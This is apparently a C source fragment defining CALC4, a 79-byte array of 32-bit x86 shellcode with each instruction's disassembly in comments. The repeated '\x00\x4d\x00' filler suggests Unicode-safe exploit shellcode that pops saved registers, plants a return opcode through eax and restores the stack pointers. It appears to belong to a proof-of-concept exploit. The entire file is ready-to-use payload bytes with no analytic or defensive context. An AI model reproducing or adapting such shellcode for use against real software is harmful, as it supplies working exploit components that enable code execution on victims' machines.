
// Target architecture : X86 32

#define CALC4_SIZE 79

char CALC4[] = {
  /* 0000 */ "\x59"                 /* pop  ecx                  */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0004 */ "\x59"                 /* pop  ecx                  */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0008 */ "\x59"                 /* pop  ecx                  */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 000C */ "\x59"                 /* pop  ecx                  */
  /* 000D */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0010 */ "\x59"                 /* pop  ecx                  */
  /* 0011 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0014 */ "\x59"                 /* pop  ecx                  */
  /* 0015 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0018 */ "\xb8\x00\x4d\x00\xff" /* mov  eax, 0xff004d00      */
  /* 001D */ "\x00\xe1"             /* add  cl, ah               */
  /* 001F */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0022 */ "\x51"                 /* push ecx                  */
  /* 0023 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0026 */ "\x58"                 /* pop  eax                  */
  /* 0027 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 002A */ "\xc6\x00\xc3"         /* mov  byte ptr [eax], 0xc3 */
  /* 002D */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0030 */ "\x59"                 /* pop  ecx                  */
  /* 0031 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0034 */ "\x5b"                 /* pop  ebx                  */
  /* 0035 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0038 */ "\x5e"                 /* pop  esi                  */
  /* 0039 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 003C */ "\x5f"                 /* pop  edi                  */
  /* 003D */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0040 */ "\x59"                 /* pop  ecx                  */
  /* 0041 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 0044 */ "\x6a\x00"             /* push 0                    */
  /* 0046 */ "\x58"                 /* pop  eax                  */
  /* 0047 */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 004A */ "\x5c"                 /* pop  esp                  */
  /* 004B */ "\x00\x4d\x00"         /* add  byte ptr [ebp], cl   */
  /* 004E */ "\x5d"                 /* pop  ebp                  */
};
